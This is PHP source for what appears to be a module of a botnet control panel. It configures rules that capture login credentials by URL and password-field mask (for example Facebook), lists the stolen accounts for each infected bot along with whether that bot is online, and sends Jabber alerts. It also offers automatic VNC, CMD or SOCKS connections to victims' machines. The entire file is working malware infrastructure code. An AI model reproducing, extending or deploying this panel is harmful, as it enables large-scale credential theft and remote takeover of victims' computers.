<?php
define('VNC_PLUGIN_INSTALLED', file_exists('system/botnet_vnc.php'));
define('ACCOUNT_DEAD_DAYS', 4);

require 'system/lib/db.php';
require 'system/lib/guiutil.php';

if (isset($_GET['ajax'])){
	switch ($_GET['ajax']){
		case 'rule':
			# POST
			if (isset($_POST['rule'])){
				$_REQUEST['rule']['id'] = $_REQUEST['id'];
				$q = mkquery('REPLACE INTO `accparse_rules` VALUES({i:id}, {s:alias}, {s:url}, {s:params}, {i:enabled}, {i:notify}, {i:autoconnect});', $_REQUEST['rule']);
				if (!mysql_query($q)) {
					header('HTTP/1.1 400 Action error');
					echo '<div class="failure">MySQL error: ', mysql_error(),'</div>';
					}
				}
			
			# Defaults
			$data = array(
				'id' => null,
				'alias' => '',
				'url' => '',
				'params' => '',
				'enabled' => 1,
				'notify' => 0,
				'autoconnect' => 0,
				);
			if (!empty($_GET['id']))
				$data['id'] = (int)$_GET['id'];
			
			# Fetch data
			if (!is_null($data['id'])){
				$R = mysql_query("SELECT * FROM `accparse_rules` WHERE `id`={$data['id']};");
				$data = mysql_fetch_assoc($R);
				}
			
			# Form
			echo '<form action="?m=reports_accparse&ajax=rule&id=', $data['id'], '" id="accparse_rule" class="ajax_form_save" data-jlog-title="'.LNG_ACCPARSE_CFG_URLRULES.': '.$data['alias'].'" method="POST">',
				'<dl>',
					'<dt>', LNG_ACCPARSE_CFG_URLRULE_ALIAS, '</dt>',
						'<dd><input type="text" name="rule[alias]" /></dd>',
					'<dt>', LNG_ACCPARSE_CFG_URLRULE_URLMASK, '</dt>',
						'<dd><input type="text" name="rule[url]" placeholder="*.facebook.com/*" />', '</dd>',
					'<dt>', LNG_ACCPARSE_CFG_URLRULE_PARAMS, '</dt>',
						'<dd>',
							'<textarea name="rule[params]" rows=5 placeholder="password*"/></textarea>',
							'<div class="hint">', LNG_ACCPARSE_CFG_URLRULE_PARAMS_HINT, '</div>',
							'</dd>',
					'<dt>', 
						'<input type="hidden" name="rule[enabled]" value="0" />',
						'<label><input type="checkbox" name="rule[enabled]" value="1" /> ',
						LNG_ACCPARSE_CFG_URLRULE_ENABLED,
						'</label></dt>',
					'<dt>', 
						'<input type="hidden" name="rule[notify]" value="0" />',
						'<label><input type="checkbox" name="rule[notify]" value="1" /> ',
						LNG_ACCPARSE_CFG_URLRULE_NOTIFY,
						'</label></dt>',
					(VNC_PLUGIN_INSTALLED?
						'<dt>'. LNG_ACCPARSE_CFG_URLRULE_AUTOCONNECT. '</dt>'.
							'<dd><ul class="radio">'.
								'<li><label><input type="radio" name="rule[autoconnect]" value="0" /> No</label>'.
								'<li><label><input type="radio" name="rule[autoconnect]" value="1" /> VNC</label>'.
								'<li><label><input type="radio" name="rule[autoconnect]" value="2" /> CMD</label>'.
								'<li><label><input type="radio" name="rule[autoconnect]" value="5" /> SOCKS</label>'.
								'</ul></dd>'
						:'<input type="hidden" name="rule[autoconnect]" value="0" />'),
					'</dl>',
					'<input type="submit" value="', LNG_ACCPARSE_CFG_URLRULE_SAVE, '" />',
					'</form>';
			echo js_form_feeder('form#accparse_rule', array(
				'rule[alias]' => $data['alias'],
				'rule[url]' => $data['url'],
				'rule[params]' => $data['params'],
				'rule[enabled]' => $data['enabled'],
				'rule[notify]' => $data['notify'],
				'rule[autoconnect]' => $data['autoconnect'],
				));
			break;
		case 'enable':
			$q = mkquery('UPDATE `accparse_rules` SET `enabled`=1 WHERE `id`={i:id};', $_REQUEST);
			mysql_query($q);
			break;
		case 'disable':
			$q = mkquery('UPDATE `accparse_rules` SET `enabled`=0 WHERE `id`={i:id};', $_REQUEST);
			mysql_query($q);
			break;
		case 'remove':
			$q = mkquery('DELETE FROM `accparse_rules` WHERE `id`={i:id};', $_REQUEST);
			mysql_query($q);
			break;
		# Accounts
		case 'fav': # Un/Mark the domain as favorite
			$account = (int)$_GET['account'];
			mysql_query("UPDATE `accparse_accounts` SET `favorite`=IF(`favorite`=0,1,0) WHERE `id`='$account';");
			break;
		case 'junk': # Un/Mark the domain as junk
			$account = (int)$_GET['account'];
			mysql_query("UPDATE `accparse_accounts` SET `favorite`=IF(`favorite`=0,-1,0) WHERE `id`='$account';");
			break;
		case 'acc_notes': # Account notes
			$account = (int)$_GET['account'];
			if (!mysql_query(mkquery('UPDATE `accparse_accounts` SET `notes`={s:notes} WHERE `id`={i:account};', $_REQUEST))){
				header('HTTP/1.1 400 AJAX error');
				print mysql_error();
				}
			break;
		default:
			header('HTTP/1.1 400 Unknown AJAX method');
			break;
		}
	die();
	}




ThemeBegin(LNG_THEME_TITLE, 0, getBotJsMenu('botmenu'), 0);

echo '<table class="table_frame" id="switch-tabs"><tr><td>', # VNC | ACCPARSE tabs
	'<ul>',
		'<li class="other"  ><a href="?m=botnet_vnc"><img src="images/vnc.png" />', LNG_MM_BOTNET_VNC, '</a></li>',
		'<li class="current"><a href="?m=reports_accparse"><img src="images/drill.png" />', LNG_MM_REPORTS_ACCPARSE, '</a></li>',
		'</ul>',
	'</td></tr></table>';

echo <<<HTML
<link rel="stylesheet" href="theme/js/contextMenu/src/jquery.contextMenu.css" />
<script src="theme/js/contextMenu/src/jquery.contextMenu.js"></script>
<script src="theme/js/contextMenu/src/jquery.ui.position.js"></script>
<script src="theme/js/page-reports_accparse.js"></script>
HTML;



#==========[ CONFIGURATION ]==========#

if (count($_GET) == 1){
	# URL rules configuration
	echo str_replace(array('{WIDTH}','{COLUMNS_COUNT}','{TEXT}'),array('100%', 1, LNG_ACCPARSE_CFG), THEME_LIST_BEGIN.THEME_LIST_TITLE);
	echo '<tr><td>';
	
	$R = mysql_query('SELECT * FROM `accparse_rules` ORDER BY `enabled` DESC;');
	echo '<table id="accparse_rules">';
	echo '<caption>', 
		LNG_ACCPARSE_CFG_URLRULES, ' ',
		'<a href="?m=reports_accparse&ajax=rule&id=0" class="ajax_colorbox"><img src="theme/images/icons/add.png" /></a>',
		'<caption>';
	echo '<THEAD><tr>',
			'<th>'.LNG_ACCPARSE_CFG_URLRULELIST_RULE.'</th>',
			'<th>'.LNG_ACCPARSE_CFG_URLRULELIST_URL.'</th>',
			'<th>'.LNG_ACCPARSE_CFG_URLRULELIST_NOTIFY.'</th>',
			VNC_PLUGIN_INSTALLED? '<th>'.LNG_ACCPARSE_CFG_URLRULELIST_AUTOCONNECT.'</th>' : '',
		'</tr></THEAD>';
	echo '<TBODY>';
	while ($R && !is_bool($r = mysql_fetch_assoc($R))){
		echo '<tr ', 'data-href="&id=', $r['id'], '"', $r['enabled']? '' : ' class="disabled"', '>';
		echo '<td><a href="?m=reports_accparse&ajax=rule&id=', $r['id'] ,'"  class="ajax_colorbox">', 
				empty($r['alias'])? substr($r['url'],0,50) : $r['alias'],
				'</a></td>';
		echo '<td>', $r['url'],'</td>';
		echo '<td>', 
			$r['notify']
				? (empty($GLOBALS['config']['accparse_jid'])
					? '<div class="error">'.LNG_ACCPARSE_CFG_NOTIFY_WARNING.'</div>'
					: 'Jabber') 
				: ''
			,'</td>';
		if (VNC_PLUGIN_INSTALLED){
			switch ($r['autoconnect']){
				case 1: $ac = 'VNC'; break;
				case 5: $ac = 'SOCKS'; break;
				default:
					$ac = '-';
				}
			echo '<td>', $ac, '</td>';
			}
		echo '</tr>';
		}
	echo '</TBODY>';	
	echo '</table>';
	
	echo '<div align=center>', LNG_HINT_CONTEXT_MENU, '</div>';
	
	echo '<div align="right"><pre>',
		'<a href="?m=ajax_config&action=accparse" class="ajax_colorbox">', LNG_ACCPARSE_CFG_NOTIFY, '</a>',
		'</pre></div>';
	
	echo '</td></tr>';
	}






#==========[ GRABBED ACCOUNTS LIST ]==========#
if (count($_GET) == 1){
	# Statistics
	$dead_threshold = time() - 60*60*24 * ACCOUNT_DEAD_DAYS;
	$stat = mysql_fetch_assoc(mysql_query(<<<SQL
		SELECT 
			COUNT(DISTINCT `acc`.`id`) AS `accounts`,
			COUNT(DISTINCT `acc`.`bot_id`) AS `bots`,
			COALESCE(SUM(`acc`.`mtime` >= $dead_threshold),0) AS `accounts_alive`
		FROM `accparse_accounts` `acc`
SQL
		));
	
	echo str_replace(array('{WIDTH}','{COLUMNS_COUNT}','{TEXT}'),array('100%', 1, LNG_ACCPARSE_STATISTICS), THEME_LIST_BEGIN.THEME_LIST_TITLE);
	echo '<tr><td id="stat">'; 
		printf(LNG_ACCPARSE_STAT,
			$stat['bots'],
			$stat['accounts'],
			$stat['accounts_alive'],
			$stat['accounts']? round(100*$stat['accounts_alive']/$stat['accounts']) : 0
			);
	echo '</tr></td>';
	}





#==========[ GRABBED ACCOUNTS LIST ]==========#
echo str_replace(array('{WIDTH}','{COLUMNS_COUNT}','{TEXT}'),array('100%', 1, LNG_ACCPARSE_ACCOUNTS), THEME_LIST_BEGIN.THEME_LIST_TITLE);
echo '<tr><td id="listings">';

# List
if (!isset($_GET['list']))
	$_GET['list'] = 'buttons';

function link2rule_accs($rule_id, $rule_name = null){
	if (empty($rule_name))
		$rule_name = array_shift(mysql_fetch_assoc(mysql_query('SELECT `alias` FROM `accparse_rules` WHERE `id`='.(int)$rule_id)));
	return sprintf('<a href="?%s&list=accs&rule=%d">%s</a>',
		mkuri(1,'m'), 
		$rule_id,
		$rule_name
		);
	}
function link2bot_accs($bot_id, $rule_id = null){
	return sprintf('<a href="?%s&list=accs&bot=%s&rule=%s">%s</a>',
		mkuri(1,'m'), 
		urlencode($bot_id),
		$rule_id,
		$bot_id
		);
	}

switch ($_GET['list']){
	case 'buttons':
		echo '<form id="buttons" method="GET"><ul>',
			'<li><a href="?', mkuri(1,'m').'&list=rules' ,'">', LNG_ACCPARSE_LSRULES, '</a></li>',
			'<li><a href="?', mkuri(1,'m').'&list=bots'  ,'">', LNG_ACCPARSE_LSBOTS, '</a></li>',
			'<li><a href="?', mkuri(1,'m').'&list=accs'  ,'">', LNG_ACCPARSE_LSACCS, '</a></li>',
			'</ul></form>';
		break;
	# List rules. On select — see the list of accounts
	case 'rules':
		# The Query
		$R = mysql_query(<<<SQL
			SELECT 
				`r`.`id`, 
				`r`.`alias`, 
				`r`.`url`, 
				`r`.`enabled`,
				COUNT(DISTINCT `a`.`bot_id`) AS `bots`,
				COUNT(DISTINCT `a`.`id`) AS `accounts`
			FROM 
				`accparse_rules` `r`
				LEFT JOIN `accparse_accounts` `a` ON(`r`.`id` = `a`.`rule_id` AND `a`.`favorite`>=0)
			GROUP BY `r`.`id`
			ORDER BY `a`.`mtime` DESC
SQL
				);
		
		# The Listing
		echo '<table id="list-rules">';
		echo '<caption>', LNG_ACCPARSE_ACCOUNTS, ': ', LNG_ACCPARSE_LSRULES, '</caption>';
		echo '<THEAD><tr>',
			'<th>', LNG_ACCPARSE_LSRULES_RULE, '</th>',
			'<th>', LNG_ACCPARSE_LSRULES_URL, '</th>',
			'<th>', LNG_ACCPARSE_LSRULES_BOTS, '</th>',
			'<th>', LNG_ACCPARSE_LSRULES_ACCOUNTS, '</th>',
			'</tr></THEAD>';
		while ($R && !is_bool($r = mysql_fetch_assoc($R))){
			echo '<tr', $r['enabled']?'':' class="disabled"', '>';
			echo '<td><a href="?', mkuri(1, 'm'), '&list=accs&rule=', $r['id'], '">', $r['alias'],'</a></td>';
			echo '<td>', $r['url'], '</td>';
			echo '<td>', $r['bots'], '</td>';
			echo '<td>', $r['accounts'], '</td>';
			echo '</tr>';
			}
		echo '<TBODY>';
		echo '</TBODY>';
		echo '</table>';
		break;
	# List bots. On select — see his accounts
	case 'bots':
		# The Input
		$where = '1=1';
		if (!empty($_GET['rule']))
			$where .= ' AND `a`.`rule_id`={i:rule}';
		$where = mkquery($where, $_GET);
		
		# The Query
		$R = mysql_query(<<<SQL
			SELECT
				`a`.`bot_id`,
				COUNT(DISTINCT `a`.`rule_id`) AS `rules`,
				COALESCE(SUM(`a`.`favorite` >= 0),0) AS `accounts`,
				IF(`b`.`rtime_last` >= (UNIX_TIMESTAMP()-{$config['botnet_timeout']}), 
						UNIX_TIMESTAMP() - `b`.`rtime_online`, 
						0) AS `bot_online`
			FROM `accparse_accounts` `a`
				LEFT JOIN `botnet_list` `b` ON(`a`.`bot_id` = `b`.`bot_id`)
			WHERE $where
			GROUP BY `a`.`bot_id`
			ORDER BY 
				`a`.`favorite` DESC,
				`a`.`mtime` DESC
SQL
				);
		
		# The Listing
		echo '<table id="list-bots">';
		echo '<caption>', 
			LNG_ACCPARSE_ACCOUNTS, ': ', LNG_ACCPARSE_LSBOTS, 
			!empty($_GET['rule'])? ' / '.link2rule_accs($_GET['rule']) : '', 
			'</caption>';
		echo '<THEAD><tr>',
			'<th>', LNG_ACCPARSE_LSBOTS_BOT, '</th>',
			'<th>', LNG_ACCPARSE_LSBOTS_RULES, '</th>',
			'<th>', LNG_ACCPARSE_LSBOTS_ACCOUNTS, '</th>',
			'</tr></THEAD>';
		echo '<TBODY>';
		while ($R && !is_bool($r = mysql_fetch_assoc($R))){
			$classes = array();
			$classes[] = $r['bot_online']? 'bot_online' : 'bot_offline';
			
			echo '<tr', $classes?' class="'.implode(' ',$classes).'"' :'' , ' >';
			echo '<th>', link2bot_accs($r['bot_id'], empty($_GET['rule'])? null : (int)$_GET['rule']), '</th>';
			echo '<td>', $r['rules'], '</td>';
			echo '<td>', $r['accounts'], '</td>';
			echo '</tr>';
			}
		echo '</TBODY>';
		echo '</table>';
		break;
	# List accounts of a rule|bot
	case 'accs':
		# The Input
		$where = '1=1';
		if (!empty($_GET['rule']))
			$where .= ' AND `a`.`rule_id`={i:rule}';
		if (!empty($_GET['bot']))
			$where .= ' AND `a`.`bot_id`={s:bot}';
		$where = mkquery($where, $_GET);

		$_GET['online'] = isset($_GET['online'])? (int)$_GET['online'] : 0;
		
		# The Query
		$R = mysql_query($q = <<<SQL
			SELECT
				`r`.`id` AS `rule_id`,
				`r`.`alias` AS `rule_alias`,
				`r`.`enabled` AS `rule_enabled`,
				`a`.`bot_id` AS `bot_id`,
				`a`.`bot_info` AS `bot_info`,
				`a`.`id` AS `acc_id`,
				`a`.`account` AS `account`,
				`a`.`mtime` AS `acc_mtime`,
				`a`.`favorite` AS `acc_favorite`,
				`a`.`notes` AS `acc_notes`,
				`b`.`os_version` AS `bot_os`,
				IF(`b`.`rtime_last` >= (UNIX_TIMESTAMP()-{$config['botnet_timeout']}), 
						UNIX_TIMESTAMP() - `b`.`rtime_online`, 
						0) AS `bot_online`
			FROM `accparse_accounts` `a`
				LEFT JOIN `accparse_rules` `r` ON(`a`.`rule_id` = `r`.`id`)
				LEFT JOIN `botnet_list` `b` ON(`a`.`bot_id` = `b`.`bot_id`)
			WHERE $where
			ORDER BY
				({$_GET['online']}=0 OR `bot_online`=1),
				`a`.`favorite` DESC,
				`a`.`mtime` DESC
SQL
				);
		
		# The Listing
		echo '<table id="list-accounts">';
		echo '<caption>', 
			LNG_ACCPARSE_ACCOUNTS, ': ', LNG_ACCPARSE_LSACCS, 
			!empty($_GET['bot'])? ' / '.link2bot_accs($_GET['bot']) : '', 
			!empty($_GET['rule'])? ' / '.link2rule_accs($_GET['rule']) : '', 
			'</caption>';
		echo '<THEAD><tr>',
			'<th>',
					'<a href="?', mkuri(0 , 'online').'&online='.((int)!$_GET['online']), '">', LNG_ACCPARSE_LSACCS_ONLINE, '</a>', ' / ',
					LNG_ACCPARSE_LSACCS_BOT,
					'</th>',
			'<th>', LNG_ACCPARSE_LSACCS_BOTINFO, '</th>',
			'<th>', LNG_ACCPARSE_LSACCS_RULE, '</th>',
			'<th>', LNG_ACCPARSE_LSACCS_ACCOUNT, '</th>',
			'<th>', LNG_ACCPARSE_LSACCS_MTIME, '</th>',
			'<th>', LNG_ACCPARSE_LSACCS_NOTES, '</th>',
			'</tr></THEAD>';
		
		$junk_started = false;
		while ($R && !is_bool($r = mysql_fetch_assoc($R))){
			$classes = array();
			if (!$r['rule_enabled'])
				$classes[] = 'disabled';
			if ($r['acc_favorite'] < 0)
				$classes[] = 'junk';
			if ($r['acc_favorite'] > 0)
				$classes[] = 'fav'; # unused
			
			if ($r['acc_favorite'] < 0 && !$junk_started){
				echo '<tr id="junk-start">',
						'<td colspan="4"><a href="#">', LNG_ACCPARSE_LSACCS_SHOWJUNK, '</a></td>',
						'</tr>';
				$junk_started = true;
				}
			if ($junk_started)
				$classes[] = 'junk-hide';
			$classes[] = $r['bot_online']? 'bot_online' : 'bot_offline';
			
			echo '<tr', $classes?' class="'.implode(' ',$classes).'"' : '', ' data-bot="', urlencode($r['bot_id']), '" data-href="&account=', $r['acc_id'], '">';
			echo '<th>', link2bot_accs($r['bot_id']), '</th>';
			echo '<td>', osDataToString($r['bot_os']), ' / ', $r['bot_info'], '</td>';
			echo '<td>', link2rule_accs($r['rule_id'], $r['rule_alias']), '</td>';
			echo '<td>', nl2br($r['account']), '</td>';
			echo '<td>', date('d.m.Y H:i:s', $r['acc_mtime']), '</td>';
			echo '<td>', 
					'<div class="acc_notes" data-href="&account=', $r['acc_id'], '" contenteditable="true">',
					$r['acc_notes'],
					'</div>',
				'</td>';
			echo '</tr>';
			}
		echo '<TBODY>';
		echo '</TBODY>';
		echo '</table>';
		
		echo '<div align=center>', LNG_HINT_CONTEXT_MENU, '</div>';
		break;
	}

echo '</td></tr>', THEME_DIALOG_END, ThemeEnd();
